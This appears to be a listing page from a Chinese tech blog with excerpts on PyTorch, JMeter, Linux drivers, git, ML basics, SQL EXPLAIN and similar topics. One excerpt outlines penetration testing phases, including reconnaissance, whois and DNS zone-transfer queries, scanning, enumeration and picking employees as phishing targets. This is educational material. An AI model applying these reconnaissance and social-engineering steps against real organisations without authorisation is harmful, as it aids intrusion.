	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bcd390f7596c8a3899795a640dab2e6e/" rel="bookmark">
			pytorch 学习笔记------线性层
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		注意事项：
1.Linear是来自nn模块下的
from torch.nn import Linear 2.flatten是来自torch模块下的和nn是平级的 from torch import nn, flatten 3.展平操作不仅仅是把一张图片进行展平，而是把一个batch里面的所有图片都进行展平，然后再连接在一起
imgs,targets = data print(imgs.shape) imgs = flatten(imgs)#展平处理，包括把batch一起展平 print(imgs.shape) 4.__init__方法 里面self.linear不是单纯的变量，而是指代对象的变量。
def __init__(self) -&gt; None: super().__init__() self.linear = Linear(196608,10)#用liner变量指向Linear对象 def forward(self,input): output = self.linear(input)#为什么属性这里可以传入参数---------》因为liner是实例化对象 return output 下面展示完整代码
import torchvision from torch import nn, flatten from torch.nn import Linear from torch.utils.data import DataLoader from torchvision import transforms test_set = torchvision.datasets.CIFAR10("./datasets2",train=False,transform=transforms.ToTensor(),download=True) test_loader = DataLoader(dataset=test_set,batch_size=64) class zj_linear(nn.Module): def __init__(self) -&gt; None: super().
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/bcd390f7596c8a3899795a640dab2e6e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/03b2320a9523bef56694cc633fff567e/" rel="bookmark">
			为什么Fast R-CNN 中说SPPNet很难进行反向传播
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		英文原文解释 “The root cause is that back-propagation through the SPP layer is highly inefficient when each training sample (i.e. RoI) comes from a different image, which is exactly how R-CNN and SPPnet networks are trained. The inefficiency stems from the fact that each RoI may have a very large receptive field, often spanning the entire input image. Since the forward pass must process the entire receptive field, the training inputs are large (often the entire image).
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/03b2320a9523bef56694cc633fff567e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ca7ea7cc8755aaf786f3da7d9631107b/" rel="bookmark">
			Jmeter快速入门
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Jmeter快速入门 目录 Jmeter快速入门1.安装Jmeter1.1.下载1.2.解压1.3.运行 2.快速入门2.1.设置中文语言2.2.基本用法 1.安装Jmeter Jmeter依赖于JDK，所以必须确保当前计算机上已经安装了JDK，并且配置了环境变量。
1.1.下载 可以Apache Jmeter官网下载，地址：
http://jmeter.apache.org/download_jmeter.cgi
当然，我们课前资料也提供了下载好的安装包：
1.2.解压 因为下载的是zip包，解压缩即可使用，目录结构如下：
其中的bin目录就是执行的脚本，其中包含启动脚本：
1.3.运行 双击即可运行，但是有两点注意：
启动速度比较慢，要耐心等待启动后黑窗口不能关闭，否则Jmeter也跟着关闭了 2.快速入门 2.1.设置中文语言 默认Jmeter的语言是英文，需要设置：
效果：
注意：上面的配置只能保证本次运行是中文，如果要永久中文，需要修改Jmeter的配置文件
打开jmeter文件夹，在bin目录中找到 jmeter.properties，添加下面配置：
language=zh_CN 注意：前面不要出现#，#代表注释，另外这里是下划线，不是中划线
2.2.基本用法 在测试计划上点鼠标右键，选择添加 &gt; 线程（用户） &gt; 线程组：
在新增的线程组中，填写线程信息：
给线程组点鼠标右键，添加http取样器：
编写取样器内容：
添加监听报告：
添加监听结果树：
汇总报告结果：
结果树：
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f13d1dc5ae3d99dff8f187966f1e812f/" rel="bookmark">
			MISC机制编写字符驱动程序
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、杂项设备 在上次的实验中编写了一个内核模块，是使用内核提供的API实现了一个简单的虚拟设备的驱动，其中字符设备是使用函数alloc_chrdev_region -&gt; cdev_alloc-&gt; cdev_init-&gt; cdev_add来注册和初始化的，而字符设备驱动也可以使用MISC机制来进行注册。
Linux把不符合预先确定的字符设备范畴称为杂项设备-MISC。
Linux的驱动设计是趋向于分层的，大多数设备都有自己归属的类型，例如按键、触摸屏属于输入设备，对于他们有一个input子系统框架。但是对于随机数发生器、时钟发生器等设备，无法明确其属于什么类型，对于这种设备统一使用misc驱动框架编写驱动程序。
MISC设备也是一个字符设备，主设备号是10，不同的杂项设备通过次设备号进行区分。
定义在major.h中，语句如下：
#define MISC_MAJOR 10
MISC设备通过结构体struct miscdevice来存储，源码如下：
struct miscdevice { int minor; //指定次设备号 const char *name; //名字 const struct file_operations *fops; //文件操作 struct list_head list; struct device *parent; struct device *this_device; const struct attribute_group **groups; const char *nodename; umode_t mode; }; minor字段相当于dev_t设备号，但是由于设定上MISC设备的主设备号是固定的，所以只需要一个int型的字段来区分次设备号就可以了
MISC的相关函数定义在drivers\char\misc.c文件中，接下来对几个重要函数进行详细分析。
二、入口函数 驱动的入口首先创建misc类，这将给misc设备实例生成设备节点时使用，然后定义文件操作集合misc_fops。
源码如下：
static struct class *misc_class; static const struct file_operations misc_fops = { .owner	= THIS_MODULE, .open	= misc_open, .
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f13d1dc5ae3d99dff8f187966f1e812f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2cfd133d74fbec57e9f102126c213485/" rel="bookmark">
			学习笔记：rebase与merge区别
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在codehub上有多个分支，每次的提交都会生成一个新的ID。如下图，假设开始各个分支都是根据ID2的提交更新后的代码进行修改，（ID号仅代表生成的时间顺序，实际的ID号是根据算法生成的）
如果我们需要将绿色分支修改的代码更新到蓝色分支，本地远程分支内与个人工作分支已经是蓝色分支对应库内最新代码，那么在绿色远程分支代码更新到个人的库后（fetch），需要将本地远程分支代码更新到个人工作分支，这时有两种方法，rebase和merge。
merge的方法是合并库时推荐使用的方法。
如下图，merge操作会将绿色的所有修改合并，解决冲突后在蓝色分支的后面新建一个ID，成为蓝色分支的最新提交，实际上就是基于父节点ID7的提交，入库后将蓝色分支库上代码更新。
如下图，rebase的方法是将提蓝色分支放到绿色分支后面提交，ID3\ID4\ID5\ID7都会转换为新的ID并进行提交，由于父节点改变，每次提交都需要解决一次冲突，因此会大大增加分支合并的难度。
综上对比merge、rebase，merge合并分支操作更加简单，rebase合并分支后链条更加整洁。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/382012ae4dae112d0cdbfa01297c91f9/" rel="bookmark">
			unshare: unshare 失败: 无效的参数
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		unshare是干嘛的？
简单说就是用来运行程序的，它允许程序不共享主进程的一些namespace，而namespace主要用来隔离进程的，当前大火的容器技术就是使用了namespace。
运行下面的命令
unshare --user --pid --map-root-user --mount-proc --fork bash
这就类似于你运行了一个容器了，docker exec -it &lt;image&gt; /bin/bash
不出问题的话，你应该就进入一个单独的执行环境了，user，pid这些都是独立于主进程的
好巧不巧，偏偏它出问题了：
unshare: unshare 失败: 无效的参数
怎么搞？
1、首先看你的内核是否支持这些namespace，使用命令ls -l /proc/$$/ns
2、max_user_namespaces文件记录了允许创建的user namespace数量，有的系统默认是0，盘它
echo 2147483647 &gt; /proc/sys/user/max_user_namespaces
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c1c880bf7d86a5d3907460f54b0353dc/" rel="bookmark">
			可见光相机与红外相机标定
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
1.打开相机
2.可见光相机畸变矫正
安装相关库
查看相机参数
修改launch文件
启动标定程序
启动矫正图像节点
3.查看相机图像
4.计算H举矩阵
手动标注获取每一组的H矩阵（h.py）
计算出平均H矩阵并查看标定效果（MeanH_Test.py）
5.接受、处理、发送图像（biaoding.py）
6.标定效果
1.打开相机 cd camera_ws source devel/setup.bash roslaunch usb_cam usb_cam-dual_model_rectified.launch 2.可见光相机畸变矫正 安装相关库 catkin_make -DCATKIN_WHITELIST_PACKAGES="aruco;aruco_ros;aruco_msgs" catkin_make -DCATKIN_WHITELIST_PACKAGES="aruco_mapping;lidar_camera_calibration" catkin_make -DCATKIN_WHITELIST_PACKAGES="" 查看相机参数 ls /dev/video* #查看video个数和名称 v4l2-ctl -d 0 --all #查看video0的参数 修改launch文件 &lt;param name="video_device" value="/dev/video1" /&gt; &lt;param name="image_width" value="640" /&gt; &lt;param name="image_height" value="480" /&gt; &lt;param name="pixel_format" value="mjpeg" /&gt; 启动标定程序 rosrun camera_calibration cameracalibrator.py --size 8x6 --square 0.06 image:=/usb_cam/image_raw camera:=/usb_cam 移动标定板时，标定窗口中的各指标增加。当CALIBRATE按钮亮起时，单击计算相机内参矩阵及矫正参数，并输出至终端，此过程可能需要1-2分钟。当SAVE按钮亮起时，单击将采集的样本图片和计算结果保存当COMMIT按钮亮起时，单击将标定结果写入~/.ros/camera_info/head_camera.yaml。注：此标定文件将被原始图像节点usb_cam读取，标定参数会被发布至话题/usb_cam/camera_info以供矫正图像节点image_proc使用。 启动矫正图像节点 ROS_NAMESPACE=/cam_rgb/usb_cam rosrun image_proc image_proc 3.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c1c880bf7d86a5d3907460f54b0353dc/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8bce1cbeaeda2425a24a396950cd1d8e/" rel="bookmark">
			1-3年Java开发工程师面试心得分享，精选面试题40道[2021-11-18持续更新]
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、前言 小编从事Java开发不到两年时间，最近也是面试过很多家公司，不说什么大厂。咱只能分享一下自己在面试过程中问到的问题，总结一下，希望可以帮助到您！！答案有时间会补上去，有了问题可以先自己百度一下，网上还是有很多的答案的。
二、Java基础面试题 1. 访问修饰符public，private，protected，default的区别？
修饰符同包下子类当前类其他包下public可以可以可以可以protected可以可以可以不可以default可以不可以可以不可以private不可以不可以可以不可以 2. final finally finalize区别
final finally finalize区别
3. String、StringBuffer、StringBuilder的区别？
String 是 Java 语言非常基础和重要的类，提供了构造和管理字符串的各种基本逻辑。它是典型的 Immutable 类，被声明成为 final class，所有属性也都是 final 的。也由于它的不可变性，类似拼接、裁剪字符串等动作，都会产生新的 String 对象。由于字符串操作的普遍性，所以相关操作的效率往往对应用性能有明显影响。
StringBuffer 是为解决上面提到拼接产生太多中间对象的问题而提供的一个类，我们可以用 append 或者 add 方法，把字符串添加到已有序列的末尾或者指定位置。StringBuffer 本质是一个线程安全的可修改字符序列，它保证了线程安全，也随之带来了额外的性能开销，所以除非有线程安全的需要，不然还是推荐使用它的后继者，也就是 StringBuilder。
StringBuilder 是 Java 1.5 中新增的，在能力上和 StringBuffer 没有本质区别，但是它去掉了线程安全的部分，有效减小了开销，是绝大部分情况下进行字符串拼接的首选。
4. String str = “wang” 和 String str = new String(“wang”) 区别？
两个语句都会先去字符串常量池中检查是否已经存在 “wang”，如果有则不用创建新的，如果没有则会在常量池中创建 “wang” 对象。
不过，String str = new String(“wang”) 还会在堆内存中创建一个str对象。
5. == 和 equals 的区别是什么？
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8bce1cbeaeda2425a24a396950cd1d8e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/15aa17162053424d9e2de552d7dd7e7c/" rel="bookmark">
			渗透测试流程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 一、前期交互阶段
二、情报搜集阶段
1、踩点
公开信息源搜索
whois查询
DNS查询
网络侦察
2、扫描
3、查点
三、威胁建模阶段
四、漏洞分析阶段
五、渗透攻击阶段
获取目标系统访问权限的方式
Windows系统
Linux系统
攻击的主要阶段
攻击的结果
六、后渗透攻击阶段
七、报告阶段
一、前期交互阶段 渗透测试人员与客户组织进行讨论，确定渗透测试的范围和目标。此阶段需要收集客户组织的需求、渗透测试的计划、范围、限制条件、服务合同等细节。
二、情报搜集阶段 可以获取网络拓扑、系统配置、安全防御措施等信息。
1、踩点 攻击者通过公开的渠道获取目标组织的各种信息，该过程称为收集公开资源情报（OSINT,Open Source Intelligence），可收集的信息包括：
●因特网域名、网络地址块及子网信息、联网的各个系统（如：组织机构的Web站点、DNS服务器）的IP地址及关键系统的软硬件信息。
●远程访问的类型、身份认证机制、VPN及相关协议（如：IPSec）。
●与合作组织的网络连接地址、连接类型及访问控制机制等。
可通过以下技术来获取：
公开信息源搜索 ●目标Web站点的HTML源代码中的注释语句（如：：&lt;!--&gt;）里往往包含重要信息。
●通过镜像整个Web站点的Wget工具将Web站点保存到本地进行查阅，效率更高、
●了解目标组织是否建有其他站点（如：www1.test.com)，组织机构是否适用VPN（如：vpn.test.com）。
●目标组织机构的相关组织也需要特别注意，比如公司的合作伙伴等，如果合作伙伴没有足够的 安全意识，就可能会治露目标组织的机密信息。
●目标组织机构的员工信息也同样重要， 比如组织机构的联系人名单和电子邮件地址，当攻击者获得系统的访问权限时，一个合法的用户名就非常重要。同时，黑客还可以发起针对目标组织机构员工的：“社会工程学”(Social Enginccing)攻击或钓鱼攻击(Phishing),一个刚刚被开除并对组织有包言的员工信息可能给黑客带来组织机构的重要信息。组织机构近期的重大事件(合并、丑闻、 裁员等)也会引起黑客的极大兴趣。
●高级搜索功能（如：Google、百度、Bing、Shodan、钟馗之眼、Maltego）等。 whois查询 whois是个用来查询域名是否已经被注册，以及注册域名的详细信息的数据库，由ICANN (互联网名称与数字地址分配机构，The Intermnet Corporation for Assigned Names andNiumbers)负责管理。
通过whois查询，可以查询到以下信息：注册机构、机构本身信息、域名、网络信息（如：IP地址)、联系信息。
DNS查询 确认关联域名后就可以进行DNS (Domain Name System,域名系统)查询了。DNS 是因特网上作为域名和IP地址相互映射的个分布式数据库。
如果DNS配置不够安全，就可能泄露组织的重要信息。其中允许不受信任的用户执行DNS区域传送(Zone Transfer) 就是最为严重的错误配置之一。区域传送是一种DNS服务器的冗余机制，允许第二主服务器使用来自主服务器的数据刷新自己的区域数据库。般而言，DNS区域传送只能在第二域名服务器上才能执行，但许多DNS服务器却错误的配置成只要有人发出请求，就会进行传送，以致目标域中的所有主机(包括内部私有DNS信息)信息泄露。
常用的DNS查询工具有dig和大多数Linux和Windows系统都支持的nslookup命令。
网络侦察 黑客在找到攻击目标的网络之后，就可以尝试确定网络的拓扑结构和可能存在的网络访问路径。常用的网络侦察工具有大多数Unix/L inux系统提供的taceroute程序和Windows系统下的tacert程序。
2、扫描 网络扫描是通过对一定范围内主机的某些特征进行试探性连接或读取，以发现目标网络中哪些系统是存活的以及这些系统都提供了哪些服务。常用的扫描工具有NMAP、SuperScan。
3、查点 查点会对目标系统进行主动的连接和查询，因此可能被目标系统记录日志。甚至触发警报。通过查点，攻击者一般可以获得用户名（后期可以进行口令破解攻击）、错误配置的共享资源和存在漏洞的软件系统等。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/15aa17162053424d9e2de552d7dd7e7c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b416075316412de81106c72466bb8389/" rel="bookmark">
			vxe-table(vxe-grid)自定义模块：列头
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		自定义列头模块 文档官网：https://xuliangzhan_admin.gitee.io/vxe-table/#/table/start/install
在列头上，有时候显示的title信息并不能满足我们想要显示的内容，这个时候查看文档，发现了自定义模块，使用插槽可以帮助我们实现自定义模板内容
使用slots 在插槽内容可以自定义模板，用css设置显示的样式
&lt;template&gt; &lt;div&gt; &lt;vxe-grid border show-overflow ref="xGrid" height="500"&gt; &lt;template #name_header="{ column }"&gt; &lt;div class="slotBox"&gt; &lt;p class="titleBox1"&gt;{{ "@" }}&lt;/p&gt; &lt;p class="titleBox2"&gt;{{ column.title }}&lt;/p&gt; &lt;/div&gt; &lt;/template&gt; &lt;/vxe-grid&gt; &lt;/div&gt; &lt;/template&gt; &lt;script&gt; // import axios from 'axios' // import request from '../libs/request' export default { data () { return { loading: false } }, created () { this.loadColumnAndData() }, methods: { loadColumnAndData () { this.loading = true Promise.all([this.mockColumns(), this.mockList()]).then((rest) =&gt; { const columns = rest[0] const data = rest[1] const startTime = Date.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b416075316412de81106c72466bb8389/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/dac9721f1452a206ac1c2ca456f4e85f/" rel="bookmark">
			2021 美图CV算法一面面经
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		记录下来，主要是给自己查漏补缺，也给大家一个面试的借鉴。
面试时长90分钟，面试60min+算法题和反问30min，面试官很nice，在面试过程中能感受到他的技术深度和见识广度。
实习相关
我实习主要做的是机器学习方面，问了我如何设计特征，如何判断特征的好坏等等（不过这些本来就是简历里的东西）
论文相关（我是菜鸡~，没有项目）
流程大致是:
整体介绍，（这个论文是做什么样的任务，达到怎么样的效果）
网络设计，（网络如何设计的），面试官是完全明白了我的网络，问我有没有了解过显著性检测里的F3Net，说我的网络和这个很像， : ( 。
基于我的介绍，有一些问答：
1.网络的速度和处理时间有比较其他模型吗？怎么样？
2.过拟合怎么解决？
3.focal loss, dice loss 和ce loss
4.一些论文细节
基础（致命）问题
BatchNorm原理，公式 （公式我回答的x减去均值除以方差 ，尴尬了）BatchNorm 的参数 γ \gamma γ和 β \beta β 在pytorch的BN层里是怎么表示的？BatchNorm层的momentum参数知道吗？是干什么用的？BatchNorm 在测试时怎么用的均值和方差？Dropout原理Dropout 在训练时随机置0，而测试时不用，那么如何平衡训练和测试时的差异？训练网络时batchsize设为很小都跑不动怎么办？（多买点显卡？ ，面试官说可以用梯度累积的方法，下来了解）python的range 和xrange的区别python的生成器和迭代器？生成器的好处是什么？如何自己实现一个生成器？你可以写一个吗？python装饰器如何实现一个装饰器？Linux会吗？不会 。。。 算法题
问我最近刷题没有？我说没怎么刷，出的比较简单
1.递归方式反转链表。
2.dfs, 类似于leetcode统计小岛个数。 反问结束。
所以BatchNorm和Dropout的源码实现有必要看一看，BatchNorm层的momentum参数我之前从未注意过，能回答上是我感觉他和带动量的SGD里的momentum应该是同一个用法。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e2a064baaaad38850971ab43220eecbb/" rel="bookmark">
			git强制覆盖本地代码（与git远程仓库保持一致）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		git fetch --all git reset --hard origin/master git pull git强制覆盖本地命令（单条执行）：
git fetch --all &amp;&amp; git reset --hard origin/master &amp;&amp; git pull 第一个是：拉取所有更新，不同步；
第二个是：本地代码同步线上最新版本(会覆盖本地所有与远程仓库上同名的文件)；
第三个是：再更新一次（其实也可以不用，第二步命令做过了其实）
备注：
命令连接符 &amp;&amp; 的意思是： 前一条命令执行成功才执行后一条命令。
扩展命令连接符 ;; 的意思是：不论前一条是否执行成功都继续执行后一条命令。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/02233dbad966fb2b0cc667023628db61/" rel="bookmark">
			【人工智能】机器学习体系
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		机器学习基础 一、机器学习的概念 1. 机器怎么学习 处理某个特定的任务，以大量的“经验”为基础对任务完成的好坏，给予一定的评判标准通过分析经验数据，任务完成得更好了 2. 机器学习的定义 主要研究计算机系统对于特定任务的性能，逐步进行改善的算法和统计模型。通过输入海量训练数据对模型进行训练，使模型掌握数据所蕴含的潜在规律，进而对新输入的数据进行准确的分类或预测。 3. 机器学习的过程 海量数据 -&gt; 提炼规律 -&gt; 预测未来 二、机器学习的分类 1. 主要分类 有监督学习：提供数据并提供数据对应结果的机器学习过程。无监督学习：提供数据并且不提供数据对应结果的机器学习过程。强化学习：通过与环境交互并获取延迟返回进而改进行为的学习过程。 2. 无监督学习 采用一组仅包含输入的数据，通过寻找数据中的内在结构来进行样本点的分组或聚类。不是响应反馈，而是要识别数据中的共性特征；对于一个新数据，可以通过判断其中是否存在这种特征，来做出响应的反馈。核心应用：统计学中的密度估计和聚类分析。应用例子：谷歌新闻 搜索新闻事件，自动地把它们聚类到一起；这些新闻事件全是同一主题的。 3. 监督学习 构建了包含输入和所需输出的一组数据的数学模型。这些数据称为训练数据，由一组训练样本组成。主要包括分类和回归。分类算法 当输出被限制为有限的一组值（离散数值）时使用 回归算法 当输出可以具有范围内的任何数值（连续数值）时使用 应用例子：预测房价或房屋出售情况
三、监督学习深入介绍 1. 监督学习三要素 模型（model）：总结数据的内在规律，用数学函数描述的系统策略（strategy）：选取最优模型的评价准则算法（algorithm）：选取最优模型的具体方法 2. 监督学习实现步骤 得到一个有限的训练数据集确定包含所有学习模型的集合确定模型选择的准则，也就是学习策略实现求解最优模型的算法，也就是学习算法通过学习算法选择最优模型利用得到的最优模型，对新数据进行预测或分析 3. 监督学习过程示例 4. 模型评估策略 训练集：输入到模型中对模型进行训练的数据集合。测试集：模型训练完成后测试训练效果的数据集合。损失函数（loss function） 用来衡量模型预测误差的大小。定义：选取模型f为决策函数，对于给定的输入参数X，f(X)为预测结果，Y为真实结果；f(X)和Y之间可能会有偏差，我们就用一个损失函数来度量预测偏差的程度，记作L(Y,f(X))损失函数是系数的函数损失函数值越小，模型就越好
5. 经验风险（empirical risk） 6. 训练误差和测试误差 训练误差（training error） 关于训练集的平均损失大小可以用来判断给定问题是否容易学习，但本质上并不重要 测试误差（testing error） 真正反映了模型对未知数据的预测能力，这种能力一般被称为泛化能力 7. 过拟合和欠拟合 欠拟合（under-fitting） 模型没有很好地捕捉到数据特征，特征集过小，导致模型不能很好地拟合数据本质：对数据的特征“学习”得不够 过拟合（over-fitting） 把训练数据学习的太彻底，以至于把噪声数据的特征也学习到了，特征集过大，导致在后期测试的时候不能够很好地识别数据，即不能正确的分类，模型泛化能力太差 8. 模型的选择 当模型复杂度增大时，训练误差会逐渐减小并趋向于0；而测试误差会先减小，达到最小值之后再增大当模型复杂度过大时，就会发生过拟合；所以模型复杂度应适当 9. 正则化（regularization） 正则化的思想是：在所有可能选择的模型中，我们应该选择能够很好地解释已知数据并且十分简单的模型 10. 交叉验证（cross validation） 数据集划分 如果样本数据充足，一种简单方法是随机将数据集切成三部分：训练集（training set），验证集（validation set）和测试集（test set） 训练集：训练模型验证集：模型选择测试集：学习方法评估 数据不充足时，可以重复地利用数据 – 交叉验证 简单交叉验证 数据随机分为两部分，如70%作为训练集，剩下30%作为测试集训练集在不同的条件下（比如参数个数）训练模型，得到不同的模型在测试集上评价各个模型的测试误差，选出最优模型 S折交叉验证（K重交叉验证） 将数据随机一切分为S个互不相交、相同大小的子集；S-1个做训练集，剩下一个做测试集重复进行训练集、测试集的选取，有S种可能的选择 留一交叉验证 11.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/02233dbad966fb2b0cc667023628db61/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ab7ef9edff34ebbaa29a6ddb24b8b0f4/" rel="bookmark">
			openeuler 欧拉操作系统的几个图形界面安装方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		欧拉操作系统openeuler 安装的时候默认是不带图形界面的，安装完成后如果要使用图形需要手工往系统里面补。
目前为止最新的21.09版本ISO安装完后在线源配置里面EPOL源路径是错误的，需要手工修改一下路径，否则是无法更新源里面的软件包信息的。
[root@localhost ~]# cat /etc/yum.repos.d/openEuler.repo #generic-repos is licensed under the Mulan PSL v2. #You can use this software according to the terms and conditions of the Mulan PSL v2. #You may obtain a copy of Mulan PSL v2 at: # http://license.coscl.org.cn/MulanPSL2 #THIS SOFTWARE IS PROVIDED ON AN "AS IS" BASIS, WITHOUT WARRANTIES OF ANY KIND, EITHER EXPRESS OR #IMPLIED, INCLUDING BUT NOT LIMITED TO NON-INFRINGEMENT, MERCHANTABILITY OR FIT FOR A PARTICULAR #PURPOSE.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ab7ef9edff34ebbaa29a6ddb24b8b0f4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/099b4ea3fa901a4819ff1460044e57d9/" rel="bookmark">
			ES6块级作用域内声明函数
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		ES6引入了块级作用域，明确允许在块级作用域之中声明函数
块级作用域之中，函数声明语句的行为类似于let，在块级作用域之外不可引用
但实际上为了减轻因此产生的不兼容问题，ES6 在附录 B里面规定，浏览器的实现可以不遵守上面的规定，有自己的行为方式。
其规则为：
允许在块级作用域内声明函数。函数声明类似于var，即会提升到全局作用域或函数作用域的头部。同时，函数声明还会提升到所在的块级作用域的头部。 报错信息是个类型错误，f 不是函数类型
事实上，根据es6在作用域中声明函数的规则，他的实际运行顺序如下：
function f() { console.log('I am outside!'); } (function () { var f = undefined; // 函数声明提升至函数作用域（或全局）的头部，赋值undefined if (false) { // 函数声明提升到所在的块级作用域的头部并赋值下面函数 function f() { console.log('I am inside!'); } } f(); // 真正的函数声明未执行，此时f为undefined }()); 上面三条规则只对 ES6 的浏览器实现有效，其他环境的实现不用遵守，还是将块级作用域的函数声明当作let处理。
考虑到环境导致的行为差异太大，应该避免在块级作用域内声明函数。如果确实需要，也应该写成函数表达式，而不是函数声明语句。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a466a43736db29f6b65a49736ea5fc98/" rel="bookmark">
			el-cascader 联级框动态懒加载数据
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		我司需要实现一个先获取省信息，再通过省来获取市级信息，以此类推。那么我们可以使用element UI中cascader连级选择器中的动态加载，这里附上解决clearable清空不彻底问题
效果如下：
话不多说，直接上代码啦
html中
&lt;el-cascader v-if="isShowAddressInfo" ref="addressRef" v-model="address" :props="cascaderProps" @change="visibleChange" :show-all-levels="true" //回显完整的地址，false则只回显镇 size="small" clearable /&gt; js中
//computed 里面 computed: { cascaderProps() { return { lazy: true, lazyLoad: this.lazyLoad, } }, }, // method里面 methods: { visibleChange() { // 当使用clearable清空的时候，只能清空搜索栏里的内容，但不能使下拉框中的内容也恢复成初始，因此需要ref if (this.address.length === 0) { let codeRef = this.$refs.addressRef codeRef.panel.activePath = [] codeRef.panel.loadCount = 0 codeRef.panel.lazyLoad() } }, async lazyLoad(node, resolve) { let level = node.level let result switch (level) { case 0: // 类型 let initRes = await getAdressCode() result = initRes.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a466a43736db29f6b65a49736ea5fc98/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b4c1e65b5abb8be56a83599831bdc24d/" rel="bookmark">
			SQL Explain 各项参数详解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一、表信息
二、explain 的两种使用方式
三、explain中的列
id列
select_type列
table列
type列
possible_keys列
key列
key_len列
ref列
rows列
Extra列
四、索引最佳实践
使用EXPLAIN关键字可以模拟优化器执行SQL语句，从而知道MySQL是 如何处理你的SQL语句的。分析你的查询语句或是结构的性能瓶颈
下面是使用 explain 的例子：
在 select 语句之前增加 explain 关键字，MySQL 会在查询上设置一个标记，执行查询时，会返回执行计划的信息，而不是执行这条SQL（如果 from 中包含子查询，仍会执行该子查询，将结果放入临时表中）
一、表信息
Mysql版本: 5.6.33
DROP TABLE IF EXISTS actor;
CREATE TABLE actor (
id int(11) NOT NULL,
name varchar(45) DEFAULT NULL,
update_time datetime DEFAULT NULL,
PRIMARY KEY (id)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
INSERT INTO actor (id, name, update_time) VALUES (1,‘a’,‘2017-12-22 15:27:18’), (2,‘b’,‘2017-12-22 15:27:18’), (3,‘c’,‘2017-12-22 15:27:18’);
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b4c1e65b5abb8be56a83599831bdc24d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6c93095f84f25dda6626d7a489ab2f3c/" rel="bookmark">
			conda的安装和使用-linux系统.md
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. 安装 conda 如果安装过python的衍生版本anaconda，那么你就已经安装过conda了。若没有就去官网下个安装包 wget -c https://repo.anaconda.com/miniconda/Miniconda3-latest-Linux-x86_64.sh chmod 777 Miniconda3-latest-Linux-x86_64.sh sh Miniconda3-latest-Linux-x86_64.sh 2. 使用 conda -h 这是首先要会用的 conda creat -h conda info [-e][-h] conda creat -n envname packagename #可以指定版本 conda search packages #搜索软件 conda install packages conda isntall packages=version -c 源 #安装的时候指定版本和源可以节省安装时间 soure activate envname #切换工作环境 soure deactivate envname #退出环境 canda的特点是把所有的东西都看作package，甚至它自己，所以你可以用conda update conda来更新conda.
3. 添加源 例如，添加清华 源
